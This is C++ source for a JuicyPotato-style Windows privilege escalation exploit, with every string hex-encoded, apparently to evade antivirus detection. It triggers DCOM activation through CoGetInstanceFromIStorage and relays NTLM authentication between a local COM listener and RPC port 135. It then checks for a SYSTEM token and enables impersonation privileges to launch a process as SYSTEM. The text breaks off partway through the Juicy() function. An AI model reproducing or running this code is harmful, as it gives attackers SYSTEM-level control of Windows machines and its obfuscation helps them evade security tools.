#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <userenv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <winsafer.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

int Juicy(wchar_t *, BOOL);
wchar_t *olestr;
wchar_t *g_port;
wchar_t *rpcserver;
wchar_t *rpcport;
char dcom_port[12];
char dcom_ip[17];

static const char VERSION[] = "0.1";
BOOL TEST_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t *processtype = NULL;
wchar_t *processargs = NULL;
wchar_t *processname = NULL;

int IsTokenSystem(HANDLE tok)
{
	
	const char  hid__S__S__xfvDw8D5hhEF[] = {'\x25','\x53','\x3b','\x25','\x53','\\','\x25','\x53','\n',0};

	const wchar_t  hid_S_Y_S__4v1JSSsAq94i[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf(hid__S__S__xfvDw8D5hhEF, olestr, DomainName, UserName);
	if (!_wcsicmp(UserName, hid_S_Y_S__4v1JSSsAq94i))
		return 1;

	return 0;
}

void usage()
{
	
	const char  hid_JuicyP_sSs6J4gqciTc[] = {'\x4a','\x75','\x69','\x63','\x79','\x50','\x6f','\x74','\x61','\x74','\x6f','\x20','\x76','\x25','\x73','\x20','\n','\n',0};

	const char  hid_Mandat_iTdabOm35vBC[] = {'\x4d','\x61','\x6e','\x64','\x61','\x74','\x6f','\x72','\x79','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x74','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x70','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x63','\x61','\x6c','\x6c','\x3a','\x20','\x3c','\x74','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x2c','\x20','\x3c','\x75','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x2c','\x20','\x3c','\x2a','\x3e','\x20','\x74','\x72','\x79','\x20','\x62','\x6f','\x74','\x68','\n','\x2d','\x70','\x20','\x3c','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x3e','\x3a','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x74','\x6f','\x20','\x6c','\x61','\x75','\x6e','\x63','\x68','\n','\x2d','\x6c','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\n',0};

	const char  hid_Option_NVYa3IGWWMjE[] = {'\x4f','\x70','\x74','\x69','\x6f','\x6e','\x61','\x6c','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x6d','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x61','\x20','\x3c','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3e','\x3a','\x20','\x63','\x6f','\x6d','\x6d','\x61','\x6e','\x64','\x20','\x6c','\x69','\x6e','\x65','\x20','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x20','\x74','\x6f','\x20','\x70','\x61','\x73','\x73','\x20','\x74','\x6f','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x4e','\x55','\x4c','\x4c','\x29','\n','\x2d','\x6b','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x69','\x70','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x6e','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x33','\x35','\x29','\n','\x2d','\x63','\x20','\x3c','\x7b','\x63','\x6c','\x73','\x69','\x64','\x7d','\x3e','\x3a','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x42','\x49','\x54','\x53','\x3a','\x7b','\x34','\x39','\x39','\x31','\x64','\x33','\x34','\x62','\x2d','\x38','\x30','\x61','\x31','\x2d','\x34','\x32','\x39','\x31','\x2d','\x38','\x33','\x62','\x36','\x2d','\x33','\x33','\x32','\x38','\x33','\x36','\x36','\x62','\x39','\x30','\x39','\x37','\x7d','\x29','\n','\x2d','\x7a','\x20','\x6f','\x6e','\x6c','\x79','\x20','\x74','\x65','\x73','\x74','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x61','\x6e','\x64','\x20','\x70','\x72','\x69','\x6e','\x74','\x20','\x74','\x6f','\x6b','\x65','\x6e','\'','\x73','\x20','\x75','\x73','\x65','\x72','\n',0};
printf(hid_JuicyP_sSs6J4gqciTc, VERSION);

	printf(hid_Mandat_iTdabOm35vBC
	);

	printf("\n\n");
	printf(hid_Option_NVYa3IGWWMjE
	);
}

PotatoAPI::PotatoAPI() {
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
	return;
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);

	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
}

int PotatoAPI::findNTLMBytes(char *bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int PotatoAPI::processNtlmBytes(char *bytes, int len) {
	
	const char  hid_Error__dfoF96BzqnOy[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x2d','\x20','\x55','\x6e','\x6b','\x6e','\x6f','\x77','\x6e','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x6d','\x65','\x73','\x73','\x61','\x67','\x65','\x20','\x74','\x79','\x70','\x65','\x2e','\x2e','\x2e',0};
int ntlmLoc = findNTLMBytes(bytes, len);
	if (ntlmLoc == -1) return -1;

	int messageType = bytes[ntlmLoc + 8];
	switch (messageType) {
		case 1:
			//NTLM type 1 message
			negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 2:
			//NTLM type 2 message
			negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 3:
			//NTLM type 3 message
			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
			break;
		default:
			printf(hid_Error__dfoF96BzqnOy);
			return -1;
			break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int PotatoAPI::triggerDCOM(void)
{
	
	const wchar_t  hid________CvW3hO83xNn3[] = {'\x7b','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x43','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x34','\x36','\x7d',0};
CoInitialize(nullptr);

	//Create IStorage object
	IStorage *stg = NULL;
	ILockBytes *lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(olestr, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(hid________CvW3hO83xNn3, &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);

	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	
	const char  hid_WSASta_WAl1dNUy7qtV[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid________R5MtUMcIYasF[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};

	const char  hid_getadd_8vMZRkPeCfqz[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_socket_hjZoo5QExZpZ[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};

	const char  hid_Unable_ssiq80Hb6ycF[] = {'\x55','\x6e','\x61','\x62','\x6c','\x65','\x20','\x74','\x6f','\x20','\x63','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x20','\x74','\x6f','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x21','\n',0};

	const char  hid_RPC____c2YuE9tEVWqW[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_RPC____qOp9rrIDtIAN[] = {'\x52','\x50','\x43','\x2d','\x3e','\x20','\x43','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x69','\x6f','\x6e','\x20','\x63','\x6c','\x6f','\x73','\x65','\x64','\n',0};

	const char  hid_RPC____cMkEuEzJzkgc[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
const int DEFAULT_BUFLEN = 4096;

	fflush(stdout);
	WSADATA wsaData;

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_WAl1dNUy7qtV, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myhost[24];
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, hid________R5MtUMcIYasF);
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf(hid_getadd_8vMZRkPeCfqz, iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf(hid_socket_hjZoo5QExZpZ, WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}

		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf(hid_Unable_ssiq80Hb6ycF);
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);
	do {
		//Monitor our sendQ until we have some data to send
		int *len = (int*)rpcSendQ->wait_pop();
		
		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf(hid_RPC____c2YuE9tEVWqW, WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf(hid_RPC____qOp9rrIDtIAN);
		}
		else {
			printf(hid_RPC____cMkEuEzJzkgc, WSAGetLastError());
			return 0;
		}

	} while (iResult > 0);

	//printf("last iResult:%d\n", iResult);
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

int PotatoAPI::startCOMListener(void) {
	
	const char  hid_WSASta_B4qWLxzwr8bh[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_getadd_sL5guSLFP43Z[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_socket_Vj59aFjtfc0o[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};

	const char  hid_bind_f_gZtxEF9ashrT[] = {'\x62','\x69','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_listen_HD42yedoi3N9[] = {'\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_accept_OCczpPfqU8j2[] = {'\x61','\x63','\x63','\x65','\x70','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_COM____O8OADn3zdco1[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_COM____eNf9da77HDTC[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid_shutdo_jPdZ9BUuCljD[] = {'\x73','\x68','\x75','\x74','\x64','\x6f','\x77','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
const int DEFAULT_BUFLEN = 4096;
	WSADATA wsaData;
	int iResult;
	struct addrinfo *result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_B4qWLxzwr8bh, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 12);
	wcstombs(dcom_port, g_port, 12);
	
	// printf("[+] Listening on port:%s\n", dcom_port);
	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		printf(hid_getadd_sL5guSLFP43Z, iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	int optval = 1;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		printf(hid_socket_Vj59aFjtfc0o, WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	//printf("startCOMListener bindresult%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_bind_f_gZtxEF9ashrT, WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf(hid_listen_HD42yedoi3N9, WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	//---- non block socket server

	timeval timeout = { 1, 0 };
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			printf(hid_accept_OCczpPfqU8j2, WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}

	int ntlmLoc;
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			
			if (!TEST_mode)
				printf(".", iResult);
			
			//check to see if the received packet has NTLM auth information
			processNtlmBytes(recvbuf, iResult);

			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();

			//Check to see if this is a packet containing NTLM authentication information before sending
			processNtlmBytes(sendbuf, *len);

			//send the new packet sendbuf
			iSendResult = send(ClientSocket, sendbuf, *len, 0);

			if (iSendResult == SOCKET_ERROR) {
				printf(hid_COM____O8OADn3zdco1, WSAGetLastError());
				exit(-11);
			}

			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0) {
			//connection closing...
			shutdown(ClientSocket, SD_SEND);
			WSACleanup();
			exit(-1);
		}
		else {
			if (!TEST_mode)
				printf(hid_COM____eNf9da77HDTC, WSAGetLastError());

			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}

	} while (iResult > 0);

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_shutdo_jPdZ9BUuCljD, WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		exit(-1);
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	
	const char  hid_Priv_L_k4JsDHxGIiiE[] = {'\x50','\x72','\x69','\x76','\x20','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};

	const char  hid_Priv_A_KH8cxKbhEjyo[] = {'\x50','\x72','\x69','\x76','\x20','\x41','\x64','\x6a','\x75','\x73','\x74','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf(hid_Priv_L_k4JsDHxGIiiE);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf(hid_Priv_A_KH8cxKbhEjyo);
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t** argv)
{
	
	const char  hid________BFlI18h0ekgs[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};

	const char  hid_Wrong__wwZ0kgEESQzK[] = {'\x57','\x72','\x6f','\x6e','\x67','\x20','\x41','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3a','\x20','\x25','\x73','\n',0};
BOOL brute = FALSE;

	strcpy(dcom_ip, hid________BFlI18h0ekgs);
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
			case 't':
				++argv;
				--argc;
				processtype = argv[1];
				break;

			case 'p':
				++argv;
				--argc;
				processname = argv[1];
				break;

			case 'l':
				++argv;
				--argc;
				g_port = argv[1];
				break;
			
			case 'c':
				++argv;
				--argc;
				olestr = argv[1];
				break;

			case 'a':
				++argv;
				--argc;
				processargs = argv[1];
				break;

			case 'm':
				++argv;
				--argc;
				memset(dcom_ip, 0, 17);
				wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
				break;

			case 'h':
				usage();
				exit(100);
				break;

			case 'k':
				++argv;
				--argc;
				rpcserver = argv[1];
				break;

			case 'n':
				++argv;
				--argc;
				rpcport = argv[1];
				break;

			case 'z':
				TEST_mode = TRUE;
				break;

			default:
				printf(hid_Wrong__wwZ0kgEESQzK, argv[1]);
				usage();
				exit(-1);
		}

		++argv;
		--argc;
	}

	if (g_port == NULL)
	{
		usage();
		exit(-1);
	}

	if ((processtype == NULL || processname == NULL) && !TEST_mode)
	{
		usage();
		exit(-1);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
		olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";

	exit(Juicy(NULL, FALSE));
}

int Juicy(wchar_t *clsid, BOOL brute)
{
	
	const char  hid_Testin_a7niVJ5dsoNp[] = {'\x54','\x65','\x73','\x74','\x69','\x6e','\x67','\x20','\x25','\x53','\x20','\x25','\x53','\n',0};

	const char  hid______a_mJv3CGMVQxDJ[] = {'\n','\x5b','\x2b','\x5d','\x20','\x61','\x75','\x74','\x68','\x72','\x65','\x73','\x75','\x6c','\x74','\x20','\x25','\x64','\n',0};

	const wchar_t  hid_S_e_I__44QHepiAJdn3[] = {'\x53','\x65','\x49','\x6d','\x70','\x65','\x72','\x73','\x6f','\x6e','\x61','\x74','\x65','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};

	const wchar_t  hid_S_e_A__IveEnXEZddyC[] = {'\x53','\x65','\x41','\x73','\x73','\x69','\x67','\x6e','\x50','\x72','\x69','\x6d','\x61','\x72','\x79','\x54','\x6f','\x6b','\x65','\x6e','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};

	const char  hid_____Er_S2RrXk61rJ2Z[] = {'\x5b','\x2d','\x5d','\x20','\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};

	const char  hid_Error__mxEYfbusA8mP[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};

	const char  hid______C_aOjWbZ2H6RAS[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid______C_1fXXQsg74Pf8[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x4f','\x4b','\n',0};

	 wchar_t  hid_C______P5DP3n5u8Boo[] = {'\x43','\x3a','\\',0};

